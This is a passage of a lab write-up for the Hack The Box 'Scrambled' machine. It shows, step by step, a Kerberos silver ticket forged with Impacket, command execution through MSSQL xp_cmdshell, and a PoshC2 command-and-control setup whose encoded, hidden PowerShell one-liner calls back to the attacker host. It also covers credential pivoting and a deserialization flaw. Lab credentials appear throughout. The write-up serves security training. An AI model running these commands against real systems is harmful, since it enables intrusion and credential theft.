<p>The Domain User <code>ksimpson</code>'s ticket is exported in the file <code>ksimpsone.ccache</code>. Then, we have to save the exported ticket in the variable <code>KRB5CCNAME</code> in order to use the flag <code>-k</code>. </p>
<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="s1">&#39;ksimpson.ccache&#39;</span>
</code></pre></div>
<p>Now we can access shared folders for the Domain User <code>ksimpson</code>: </p>
<div class="highlight"><pre><span></span><code>impacket-smbclient<span class="w"> </span>scrm.local/ksimpson@dc1.scrm.local<span class="w"> </span>-k<span class="w"> </span>-no-pass

<span class="c1"># shares</span>
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL
<span class="c1"># use public</span>
<span class="c1"># ls</span>
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Thu<span class="w"> </span>Nov<span class="w">  </span><span class="m">4</span><span class="w"> </span><span class="m">18</span>:23:19<span class="w"> </span><span class="m">2021</span><span class="w"> </span>.
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Thu<span class="w"> </span>Nov<span class="w">  </span><span class="m">4</span><span class="w"> </span><span class="m">18</span>:23:19<span class="w"> </span><span class="m">2021</span><span class="w"> </span>..
-rw-rw-rw-<span class="w">     </span><span class="m">630106</span><span class="w">  </span>Fri<span class="w"> </span>Nov<span class="w">  </span><span class="m">5</span><span class="w"> </span><span class="m">13</span>:45:07<span class="w"> </span><span class="m">2021</span><span class="w"> </span>Network<span class="w"> </span>Security<span class="w"> </span>Changes.pdf
<span class="c1"># get Network Security Changes.pdf</span>
<span class="c1"># exit</span>
</code></pre></div>
<p>From <code>Public</code> shared folder we identify a document that contains: </p>
<p><img alt="" src="../writeup.assets/image-20220715070953056.png" /></p>
<p>After reading the letter we verified that the NTLM authentication is disabled in the machine. </p>
<h2 id="access-mssql">Access MSSQL<a class="headerlink" href="#access-mssql" title="Permanent link">&para;</a></h2>
<p>What we can do now is access MSSQL service using <code>sqlsvc</code> service account via kerberos authentication. To do that, first we have to request for <strong>Ticket-Granting Service (TGS)</strong> ticket that will allows us to access the MSSQL service, or let's say we conduct silver ticket attack. Before we do that, we have to know SID of the domain. We can run <code>SecretDump</code> with the flag <code>-debug</code>: </p>
<div class="highlight"><pre><span></span><code>secretsdump<span class="w"> </span>scrm.local/ksimpson@dc1.scrm.local<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-debug
Impacket<span class="w"> </span>v0.10.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2022</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation

<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Impacket<span class="w"> </span>Library<span class="w"> </span>Installation<span class="w"> </span>Path:<span class="w"> </span>/home/kali/.local/lib/python3.9/site-packages/impacket
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>Kerberos<span class="w"> </span>Cache:<span class="w"> </span>ksimpson.ccache
...<span class="w"> </span>
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Calling<span class="w"> </span>DRSCrackNames<span class="w"> </span><span class="k">for</span><span class="w"> </span>S-1-5-21-2743207045-1827831105-2542523200-500
...
</code></pre></div>
<p>From the <code>SecretDump</code> output, the SID for the Domain SCRM.LOCAL is: <code>S-1-5-21-2743207045-1827831105-2542523200</code>. I removed 500 because it is represents the Domain Administrator. </p>
<p>Furthermore, to conduct the attack the NTLM hash of the service account <code>sqlsvc</code> is required. We can convert the password of the service account <code>sqlsvc</code> to NTLM hash using Python. </p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">hashlib</span><span class="o">,</span> <span class="nn">binascii</span>
<span class="nb">hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;md4&#39;</span><span class="p">,</span> <span class="s2">&quot;Pegasus60&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-16le&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
<span class="nb">print</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="nb">hash</span><span class="p">))</span>
</code></pre></div>
<p><img alt="" src="../writeup.assets/image-20220715073726718.png" /></p>
<p><code>sqlsvc</code> NTLM hash is: <code>b999a16500b87d17ec7f2e2a68778f05</code> </p>
<p>Now we will use Impacket's <code>ticket</code> to generate TGS that will allow us to access MSSQL service: </p>
<div class="highlight"><pre><span></span><code>ticketer.py<span class="w"> </span>-domain-sid<span class="w"> </span>S-1-5-21-2743207045-1827831105-2542523200<span class="w"> </span>-nthash<span class="w"> </span>b999a16500b87d17ec7f2e2a68778f05<span class="w"> </span>-domain<span class="w"> </span>scrm.local<span class="w"> </span>-spn<span class="w"> </span>MSSQLSvc/dc1.scrm.local<span class="w"> </span>administrator
Impacket<span class="w"> </span>v0.10.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2022</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Creating<span class="w"> </span>basic<span class="w"> </span>skeleton<span class="w"> </span>ticket<span class="w"> </span>and<span class="w"> </span>PAC<span class="w"> </span>Infos
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Customizing<span class="w"> </span>ticket<span class="w"> </span><span class="k">for</span><span class="w"> </span>scrm.local/administrator
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>PAC_LOGON_INFO
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>PAC_CLIENT_INFO_TYPE
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>EncTicketPart
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>EncTGSRepPart
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Signing/Encrypting<span class="w"> </span>final<span class="w"> </span>ticket
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>PAC_SERVER_CHECKSUM
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>PAC_PRIVSVR_CHECKSUM
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>EncTicketPart
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>EncTGSRepPart
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>ticket<span class="w"> </span><span class="k">in</span><span class="w"> </span>administrator.ccache
</code></pre></div>
<p>The TGS ticket saved in the file <code>administrator.ccache</code> we have to save it in the variable <code>KRB5CCACHENAME</code>:</p>
<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="s1">&#39;administrator.ccache&#39;</span>
</code></pre></div>
<p>Now we can access MSSQL: </p>
<div class="highlight"><pre><span></span><code>impacket-mssqlclient<span class="w"> </span>dc1.scrm.local<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.168<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w">       </span>
Impacket<span class="w"> </span>v0.10.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2022</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Encryption<span class="w"> </span>required,<span class="w"> </span>switching<span class="w"> </span>to<span class="w"> </span>TLS
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span>master,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span>master
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span>,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span>us_english
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span><span class="m">4096</span>,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span><span class="m">16192</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>INFO<span class="o">(</span>DC1<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Changed<span class="w"> </span>database<span class="w"> </span>context<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;master&#39;</span>.
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>INFO<span class="o">(</span>DC1<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Changed<span class="w"> </span>language<span class="w"> </span>setting<span class="w"> </span>to<span class="w"> </span>us_english.
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ACK:<span class="w"> </span>Result:<span class="w"> </span><span class="m">1</span><span class="w"> </span>-<span class="w"> </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="o">(</span><span class="m">150</span><span class="w"> </span><span class="m">7208</span><span class="o">)</span><span class="w"> </span>
<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Press<span class="w"> </span><span class="nb">help</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>extra<span class="w"> </span>shell<span class="w"> </span>commands
SQL&gt;<span class="w"> </span>
</code></pre></div>
<p>After obtaining access into MSSQL, the first thing we can do is enable <code>xp_cmdshell</code> to allow us to execute commands: </p>
<div class="highlight"><pre><span></span><code>SQL&gt;<span class="w"> </span>enable_xp_cmdshell
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>INFO<span class="o">(</span>DC1<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">185</span>:<span class="w"> </span>Configuration<span class="w"> </span>option<span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="w"> </span>changed<span class="w"> </span>from<span class="w"> </span><span class="m">1</span><span class="w"> </span>to<span class="w"> </span><span class="m">1</span>.<span class="w"> </span>Run<span class="w"> </span>the<span class="w"> </span>RECONFIGURE<span class="w"> </span>statement<span class="w"> </span>to<span class="w"> </span>install.
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>INFO<span class="o">(</span>DC1<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">185</span>:<span class="w"> </span>Configuration<span class="w"> </span>option<span class="w"> </span><span class="s1">&#39;xp_cmdshell&#39;</span><span class="w"> </span>changed<span class="w"> </span>from<span class="w"> </span><span class="m">1</span><span class="w"> </span>to<span class="w"> </span><span class="m">1</span>.<span class="w"> </span>Run<span class="w"> </span>the<span class="w"> </span>RECONFIGURE<span class="w"> </span>statement<span class="w"> </span>to<span class="w"> </span>install.
SQL&gt;<span class="w"> </span>
disable_xp_cmdshell<span class="w">  </span>enable_xp_cmdshell<span class="w">   </span><span class="nb">exit</span><span class="w">                 </span><span class="nb">help</span><span class="w">                 </span>lcd<span class="w">                  </span>shell<span class="w">                </span>xp_cmdshell<span class="w">          </span>
SQL&gt;<span class="w"> </span>xp_cmdshell<span class="w"> </span>whoami
output<span class="w">                                                                             </span>

--------------------------------------------------------------------------------<span class="w">   </span>

scrm<span class="se">\s</span>qlsvc<span class="w">                                                                        </span>

NULL<span class="w">                                                                               </span>

SQL&gt;<span class="w"> </span>
</code></pre></div>
<h2 id="configuring-poshc2">Configuring PoshC2<a class="headerlink" href="#configuring-poshc2" title="Permanent link">&para;</a></h2>
<p>First of all, create a new project and name it as you want. I'll name it as <code>htb</code>. </p>
<div class="highlight"><pre><span></span><code>posh-project<span class="w"> </span>htb
</code></pre></div>
<p>Then, configure the newly created profile. </p>
<div class="highlight"><pre><span></span><code>posh-config
</code></pre></div>
<p>Go to the 14th line and point the value of <code>PayloadCommsHost</code> to your VPN IP. </p>
<div class="highlight"><pre><span></span><code>PayloadCommsHost:<span class="w"> </span><span class="s2">&quot;https://&lt;your_vpn_ip&gt;&quot;</span>
</code></pre></div>
<p><img alt="" src="../writeup.assets/image-20220702072612918.png" /></p>
<p>Start the PoshC2 server by typing</p>
<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>posh-server
</code></pre></div>
<p>In another windows connect the team server</p>
<div class="highlight"><pre><span></span><code>posh<span class="w"> </span>-u<span class="w"> </span>user1<span class="w"> </span>
</code></pre></div>
<p><img alt="" src="../writeup.assets/image-20220702072830718.png" /></p>
<p>Now we have two windows. At the left is the team server and at the right is the user terminal. To make use of the C2 we should drop our beacon or payload into the box usually we have command execution in the box. There is a lots of payloads types that PoshC2 generates such as <code>Powershell reverse shell</code>, <code>Dlls</code>,<code>EXEs</code>, <code>Macros</code>, <code>DotNet2JS</code> or even <code>HTAs</code> which can be used in phishing campaigns. </p>
<h2 id="obtaining-access">Obtaining Access<a class="headerlink" href="#obtaining-access" title="Permanent link">&para;</a></h2>
<p>As I said PoshC2 have generated several payloads types, as demonstration we can use powershell oneliner. Run this command in MSSQL. </p>
<p><img alt="" src="../writeup.assets/image-20220715074845813.png" /></p>
<div class="highlight"><pre><span></span><code>SQL&gt;<span class="w"> </span>xp_cmdshell<span class="w"> </span>powershell<span class="w"> </span>-exec<span class="w"> </span>bypass<span class="w"> </span>-Noninteractive<span class="w"> </span>-windowstyle<span class="w"> </span>hidden<span class="w"> </span>-e<span class="w"> </span>WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgB....FMA
</code></pre></div>
<p>After running this command in MSSQL we will receive a new implant in our C2.  </p>
<p>Team server window:</p>
<p><img alt="" src="../writeup.assets/image-20220715075144324.png" /></p>
<p>Operation window: </p>
<p><img alt="" src="../writeup.assets/image-20220715075203485.png" /></p>
<p>If we execute the command <code>help</code> we can do many useful  operations such as: Active Directory enumeration, lateral movement, privilege escalation and many. </p>
<p>As an example, let's enumerate domain objects ACLs: </p>
<div class="highlight"><pre><span></span><code>SCRM<span class="se">\s</span>qlsvc<span class="w"> </span>@<span class="w"> </span>DC1<span class="w"> </span><span class="o">(</span>PID:5948<span class="o">)</span>
PS<span class="w"> </span><span class="m">1</span>&gt;<span class="w"> </span>invoke-aclscanner<span class="w"> </span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="c1"># teamserver: </span>
Task<span class="w"> </span><span class="m">00003</span><span class="w"> </span><span class="o">(</span>user1<span class="o">)</span><span class="w"> </span>returned<span class="w"> </span>against<span class="w"> </span>implant<span class="w"> </span><span class="m">1</span><span class="w"> </span>on<span class="w"> </span>host<span class="w"> </span>SCRM<span class="se">\s</span>qlsvc<span class="w"> </span>@<span class="w"> </span>DC1<span class="w"> </span><span class="o">(</span><span class="m">2022</span>-07-15<span class="w"> </span><span class="m">07</span>:56:23<span class="o">)</span>



ObjectDN<span class="w">                </span>:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>RootDNSServers,CN<span class="o">=</span>MicrosoftDNS,CN<span class="o">=</span>System,DC<span class="o">=</span>scrm,DC<span class="o">=</span><span class="nb">local</span>
AceQualifier<span class="w">            </span>:<span class="w"> </span>AccessAllowed
ActiveDirectoryRights<span class="w">   </span>:<span class="w"> </span>CreateChild,<span class="w"> </span>DeleteChild,<span class="w"> </span>ListChildren,<span class="w"> </span>ReadProperty,<span class="w"> </span>DeleteTree,<span class="w"> </span>ExtendedRight,<span class="w"> </span>Delete,<span class="w"> </span>
<span class="w">                          </span>GenericWrite,<span class="w"> </span>WriteDacl,<span class="w"> </span>WriteOwner
ObjectAceType<span class="w">           </span>:<span class="w"> </span>None
AceFlags<span class="w">                </span>:<span class="w"> </span>ContainerInherit,<span class="w"> </span>Inherited
AceType<span class="w">                 </span>:<span class="w"> </span>AccessAllowed
InheritanceFlags<span class="w">        </span>:<span class="w"> </span>ContainerInherit
SecurityIdentifier<span class="w">      </span>:<span class="w"> </span>S-1-5-21-2743207045-1827831105-2542523200-1101
IdentityReferenceName<span class="w">   </span>:<span class="w"> </span>DnsAdmins
IdentityReferenceDomain<span class="w"> </span>:<span class="w"> </span>scrm.local
IdentityReferenceDN<span class="w">     </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>DnsAdmins,CN<span class="o">=</span>Users,DC<span class="o">=</span>scrm,DC<span class="o">=</span><span class="nb">local</span>
IdentityReferenceClass<span class="w">  </span>:<span class="w"> </span>group

ObjectDN<span class="w">                </span>:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>@,DC<span class="o">=</span>RootDNSServers,CN<span class="o">=</span>MicrosoftDNS,CN<span class="o">=</span>System,DC<span class="o">=</span>scrm,DC<span class="o">=</span><span class="nb">local</span>
AceQualifier<span class="w">            </span>:<span class="w"> </span>AccessAllowed
ActiveDirectoryRights<span class="w">   </span>:<span class="w"> </span>CreateChild,<span class="w"> </span>DeleteChild,<span class="w"> </span>ListChildren,<span class="w"> </span>ReadProperty,<span class="w"> </span>DeleteTree,<span class="w"> </span>ExtendedRight,<span class="w"> </span>Delete,<span class="w"> </span>
<span class="w">                          </span>GenericWrite,<span class="w"> </span>WriteDacl,<span class="w"> </span>WriteOwner
ObjectAceType<span class="w">           </span>:<span class="w"> </span>None
AceFlags<span class="w">                </span>:<span class="w"> </span>ContainerInherit,<span class="w"> </span>Inherited
AceType<span class="w">                 </span>:<span class="w"> </span>AccessAllowed
InheritanceFlags<span class="w">        </span>:<span class="w"> </span>ContainerInherit
SecurityIdentifier<span class="w">      </span>:<span class="w"> </span>S-1-5-21-2743207045-1827831105-2542523200-1101
IdentityReferenceName<span class="w">   </span>:<span class="w"> </span>DnsAdmins
IdentityReferenceDomain<span class="w"> </span>:<span class="w"> </span>scrm.local
IdentityReferenceDN<span class="w">     </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>DnsAdmins,CN<span class="o">=</span>Users,DC<span class="o">=</span>scrm,DC<span class="o">=</span><span class="nb">local</span>
IdentityReferenceClass<span class="w">  </span>:<span class="w"> </span>group
</code></pre></div>
<h2 id="pivot-to-miscsql">Pivot to MiscSQL<a class="headerlink" href="#pivot-to-miscsql" title="Permanent link">&para;</a></h2>
<p>Going back to MSSQL, enumerate the databases: </p>
<div class="highlight"><pre><span></span><code><span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysdatabases</span><span class="p">;</span>
<span class="n">name</span>

<span class="c1">--------------------------------------------------------------------------------------------------------------------------------   </span>

<span class="n">master</span><span class="w">                                                                                                                             </span>

<span class="n">tempdb</span><span class="w">                                                                                                                             </span>

<span class="n">model</span><span class="w">                                                                                                                              </span>

<span class="n">msdb</span><span class="w">                                                                                                                               </span>

<span class="n">ScrambleHR</span>
</code></pre></div>
<p>Enumerating the database <code>ScrambleHR</code> tables disclose for us the table <code>UserImport</code> </p>
<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">SYSOBJECTS</span>
</code></pre></div>
<p>The table <code>UserImport</code> contains a Domain User creds:</p>
<div class="highlight"><pre><span></span><code><span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">UserImport</span>
<span class="n">LdapUser</span><span class="w">                                             </span><span class="n">LdapPwd</span><span class="w">                                              </span><span class="n">LdapDomain</span><span class="w">                                           </span><span class="n">RefreshInterval</span><span class="w">   </span><span class="n">IncludeGroups</span><span class="w">   </span>

<span class="c1">--------------------------------------------------   --------------------------------------------------   --------------------------------------------------   ---------------   -------------   </span>

<span class="n">MiscSvc</span><span class="w">                                              </span><span class="n">ScrambledEggs9900</span><span class="w">                                    </span><span class="n">scrm</span><span class="p">.</span><span class="k">local</span><span class="w">                                                        </span><span class="mi">90</span><span class="w">               </span><span class="mi">0</span><span class="w">   </span>

<span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span>
</code></pre></div>
<p>The creds are <code>MiscSvc:ScrambledEggs9900</code> we can test the validity of the obtained creds using PoshC2</p>
<div class="highlight"><pre><span></span><code>PS<span class="w"> </span><span class="m">1</span>&gt;<span class="w"> </span>test-adcredential<span class="w"> </span>-domain<span class="w"> </span>scrm.local<span class="w"> </span>-user<span class="w"> </span>miscsvc<span class="w"> </span>-password<span class="w"> </span>ScrambledEggs9900
</code></pre></div>
<p>Team Server: </p>
<div class="highlight"><pre><span></span><code>Task<span class="w"> </span><span class="m">00023</span><span class="w"> </span><span class="o">(</span>user1<span class="o">)</span><span class="w"> </span>returned<span class="w"> </span>against<span class="w"> </span>implant<span class="w"> </span><span class="m">1</span><span class="w"> </span>on<span class="w"> </span>host<span class="w"> </span>SCRM<span class="se">\s</span>qlsvc<span class="w"> </span>@<span class="w"> </span>DC1<span class="w"> </span><span class="o">(</span><span class="m">2022</span>-07-15<span class="w"> </span><span class="m">08</span>:23:53<span class="o">)</span>


Username<span class="w"> </span>Password<span class="w">          </span>IsValid
--------<span class="w"> </span>--------<span class="w">          </span>-------
miscsvc<span class="w">  </span>ScrambledEggs9900<span class="w"> </span>True
</code></pre></div>
<p>To pivot to the Domain User <code>MiscSVC</code> run the following command in operations window: </p>
<div class="highlight"><pre><span></span><code><span class="nv">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>ConvertTo-SecureString<span class="w"> </span><span class="s2">&quot;ScrambledEggs9900&quot;</span><span class="w"> </span>-AsPlainText<span class="w"> </span>-Force
<span class="nv">$creds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>new-object<span class="w"> </span>system.management.automation.pscredential<span class="o">(</span><span class="s2">&quot;scrm.local\miscsvc&quot;</span>,<span class="w"> </span><span class="nv">$password</span><span class="o">)</span><span class="w"> </span>
invoke-command<span class="w"> </span>-computer<span class="w"> </span>.<span class="w"> </span>-scriptblock<span class="w"> </span><span class="o">{</span><span class="w"> </span>&lt;PoshC2<span class="w"> </span>powershell<span class="w"> </span>oneliner<span class="w"> </span>payload&gt;<span class="w"> </span><span class="o">}</span><span class="w"> </span>-credential<span class="w"> </span><span class="nv">$creds</span><span class="w"> </span>
</code></pre></div>
<p>After running the commands we will receive new implant as the domain user <code>miscsvc</code> </p>
<p><img alt="" src="../writeup.assets/image-20220715083447831.png" /></p>
<p><img alt="" src="../writeup.assets/image-20220715083408237.png" /></p>
<p>Now we obtain access as <code>miscsvc</code></p>
<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
<h3 id="enumerating-sales-app">Enumerating Sales App<a class="headerlink" href="#enumerating-sales-app" title="Permanent link">&para;</a></h3>
<p>By enumerating the host, we will identifies executable application "<strong>Sales Order App</strong>" which is locate at: <code>c:\shares\it\apps\Sales Order Client</code>.</p>
<p><img alt="" src="../writeup.assets/image-20220715085215453.png" /></p>
<p>We can download both files using PoshC2 by issuing the following command: </p>
<div class="highlight"><pre><span></span><code>download-file<span class="w"> </span><span class="s2">&quot;c:\shares\it\apps\Sales Order Client\ScrambleClient.exe&quot;</span>
download-file<span class="w"> </span><span class="s2">&quot;c:\shares\it\apps\Sales Order Client\ScrambleLib.dll&quot;</span>
</code></pre></div>
<p>The download location is at: <code>/var/poshc2/htb/downloads</code>. </p>
<p>Here I used dnSpy to decompile the .NET applications. I focused in the .dll. After enumerating the source code of <code>ScrambleLib.dll</code>, found a function called <code>UploadOrder</code> that takes the input and deserialize it. From the first code, we can identify that we can pass the string <code>UPLOAD_ORDER</code> followed by simi-column followed by serialize object in base64 format. After passing this input the server will deserialize it and execute it. </p>
<div class="highlight"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="n">GetCodeFromMessageType</span><span class="p">(</span><span class="n">ScrambleNetRequest</span><span class="p">.</span><span class="n">RequestType</span><span class="w"> </span><span class="n">MsgType</span><span class="p">)</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ScrambleNetRequest</span><span class="p">.</span><span class="n">_MessageTypeToCode</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">null</span><span class="p">)</span>
<span class="w">            </span><span class="p">{</span>
<span class="w">                </span><span class="n">ScrambleNetRequest</span><span class="p">.</span><span class="n">_MessageTypeToCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Dictionary</span><span class="o">&lt;</span><span class="n">ScrambleNetRequest</span><span class="p">.</span><span class="n">RequestType</span><span class="p">,</span><span class="w"> </span><span class="n">string</span><span class="o">&gt;</span><span class="p">();</span>
<span class="w">                </span><span class="n">ScrambleNetRequest</span><span class="p">.</span><span class="n">_MessageTypeToCode</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">ScrambleNetRequest</span><span class="p">.</span><span class="n">RequestType</span><span class="p">.</span><span class="n">CloseConnection</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;QUIT&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="n">ScrambleNetRequest</span><span class="p">.</span><span class="n">_MessageTypeToCode</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">ScrambleNetRequest</span><span class="p">.</span><span class="n">RequestType</span><span class="p">.</span><span class="n">ListOrders</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;LIST_ORDERS&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="n">ScrambleNetRequest</span><span class="p">.</span><span class="n">_MessageTypeToCode</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">ScrambleNetRequest</span><span class="p">.</span><span class="n">RequestType</span><span class="p">.</span><span class="n">AuthenticationRequest</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;LOGON&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="n">ScrambleNetRequest</span><span class="p">.</span><span class="n">_MessageTypeToCode</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">ScrambleNetRequest</span><span class="p">.</span><span class="n">RequestType</span><span class="p">.</span><span class="n">UploadOrder</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;UPLOAD_ORDER&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">ScrambleNetRequest</span><span class="p">.</span><span class="n">_MessageTypeToCode</span><span class="p">[</span><span class="n">MsgType</span><span class="p">];</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="n">UploadOrder</span><span class="p">(</span><span class="n">SalesOrder</span><span class="w"> </span><span class="n">NewOrder</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">try</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="n">Log</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&quot;Uploading new order with reference &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">NewOrder</span><span class="p">.</span><span class="n">ReferenceNumber</span><span class="p">);</span>
<span class="w">        </span><span class="n">string</span><span class="w"> </span><span class="n">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NewOrder</span><span class="p">.</span><span class="n">SerializeToBase64</span><span class="p">();</span>
<span class="w">        </span><span class="n">Log</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&quot;Order serialized to base64: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">text</span><span class="p">);</span>
<span class="w">        </span><span class="n">ScrambleNetResponse</span><span class="w"> </span><span class="n">scrambleNetResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="p">.</span><span class="n">SendRequestAndGetResponse</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="n">ScrambleNetRequest</span><span class="p">(</span><span class="n">ScrambleNetRequest</span><span class="p">.</span><span class="n">RequestType</span><span class="p">.</span><span class="n">UploadOrder</span><span class="p">,</span><span class="w"> </span><span class="n">text</span><span class="p">));</span>
<span class="w">        </span><span class="n">ScrambleNetResponse</span><span class="p">.</span><span class="n">ResponseType</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">scrambleNetResponse</span><span class="p">.</span><span class="n">Type</span><span class="p">;</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">type</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">ScrambleNetResponse</span><span class="p">.</span><span class="n">ResponseType</span><span class="p">.</span><span class="n">Success</span><span class="p">)</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="n">throw</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">ApplicationException</span><span class="p">(</span><span class="n">scrambleNetResponse</span><span class="p">.</span><span class="n">GetErrorDescription</span><span class="p">());</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">Log</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&quot;Upload successful&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
